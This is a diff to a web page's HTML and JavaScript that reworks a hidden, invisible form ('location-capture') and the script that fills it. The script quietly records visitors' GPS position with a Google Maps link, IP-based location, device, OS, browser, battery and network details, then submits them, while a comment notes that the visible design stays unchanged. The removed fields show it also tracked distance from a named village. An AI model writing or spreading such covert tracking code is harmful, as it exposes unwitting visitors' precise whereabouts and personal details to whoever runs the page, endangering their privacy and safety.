@@ -967,57 +967,21 @@ html.location-gate-pending body {
 <!-- Hidden Netlify form for one-time location email. Visible design is unchanged. -->
 <form aria-hidden='true' hidden method='POST' name='location-capture' style='display:none'>
   <input type="hidden" name="form-name" value="location-capture" />
-  <input type="hidden" name="submit_time" />
-  <input type="hidden" name="page_url" />
-  <textarea name="visitor_summary"></textarea>
-  <input type="hidden" name="visitor_id" />
-  <input type="hidden" name="local_time" />
-  <input type="hidden" name="permission_status" />
-  <input type="hidden" name="location_error" />
-  <input type="hidden" name="gps_quality_score" />
-  <input type="hidden" name="accuracy_meters" />
-  <input type="hidden" name="gps_latitude" />
-  <input type="hidden" name="gps_longitude" />
-  <input type="hidden" name="google_maps_link" />
-  <input type="hidden" name="ip_address" />
+  <input type="hidden" name="date" />
+  <input type="hidden" name="time" />
   <input type="hidden" name="ip_city" />
   <input type="hidden" name="ip_region" />
   <input type="hidden" name="ip_country" />
-  <input type="hidden" name="ip_org" />
-  <input type="hidden" name="ip_details" />
+  <input type="hidden" name="gps_quality_score" />
+  <input type="hidden" name="accuracy_meters" />
+  <input type="hidden" name="google_maps_link" />
+  <input type="hidden" name="battery_info" />
   <input type="hidden" name="device_type" />
-  <input type="hidden" name="is_mobile_device" />
   <input type="hidden" name="mobile_model" />
   <input type="hidden" name="os_name" />
-  <input type="hidden" name="os_version" />
   <input type="hidden" name="browser_name" />
-  <input type="hidden" name="browser_version" />
-  <input type="hidden" name="screen_size" />
-  <input type="hidden" name="viewport_size" />
   <input type="hidden" name="network_type" />
-  <input type="hidden" name="is_tablet_device" />
-  <input type="hidden" name="is_pwa_standalone" />
-  <input type="hidden" name="page_open_time_iso" />
-  <input type="hidden" name="page_open_time_local" />
-  <input type="hidden" name="visibility_state" />
-  <input type="hidden" name="connection_type" />
-  <input type="hidden" name="connection_downlink_max" />
-  <input type="hidden" name="battery_level_percent" />
-  <input type="hidden" name="battery_charging" />
-  <input type="hidden" name="battery_charging_time_seconds" />
-  <input type="hidden" name="battery_discharging_time_seconds" />
-  <input type="hidden" name="ip_postal" />
-  <input type="hidden" name="ip_country_code" />
-  <input type="hidden" name="ip_asn" />
-  <input type="hidden" name="ip_version" />
-  <input type="hidden" name="ip_currency" />
-  <input type="hidden" name="ip_calling_code" />
-  <input type="hidden" name="ip_languages" />
-  <input type="hidden" name="distance_from_darekarwadi_km" />
-  <input type="hidden" name="near_darekarwadi_status" />
-  <input type="hidden" name="near_ahilyanagar_status" />
-  <input type="hidden" name="extra_summary" />
-  <input type="hidden" name="device_summary" />
+  <textarea name="visitor_summary"></textarea>
 </form>
 
   <main class="wrap">
@@ -1699,6 +1663,10 @@ html.location-gate-pending body {
     device = device || syncDeviceInfo();
     const gps = buildGpsFields(reason);
     
+    const now = new Date();
+    const dateStr = now.toLocaleDateString();
+    const timeStr = now.toLocaleTimeString();
+
     const summary = [
       "VISITOR SUMMARY:",
       "Browser: " + (device.browser_name || "Unknown"),
@@ -1708,13 +1676,12 @@ html.location-gate-pending body {
       "Location IP: " + (ip.ip_city || "?") + ", " + (ip.ip_region || "?") + ", " + (ip.ip_country || "?"),
       "Location GPS: " + (gps.gps_quality_score !== "No GPS location received" ? (gps.gps_quality_score + " (" + gps.accuracy_meters + "m)") : "Denied / Blocked"),
       "Map Link: " + (gps.google_maps_link !== "Not available" ? gps.google_maps_link : "No GPS Map"),
-      "Network: " + (device.network_type || "Unknown"),
-      "Time: " + (device.local_time || "Unknown")
+      "Network: " + (device.network_type || "Unknown")
     ].join("\n");
 
     const fields = Object.assign({}, gps, ip, device, {
-      submit_time: new Date().toISOString(),
-      page_url: window.location.href,
+      date: dateStr,
+      time: timeStr,
       visitor_summary: summary
     });
     await submitLocation(fields, preferBeacon);
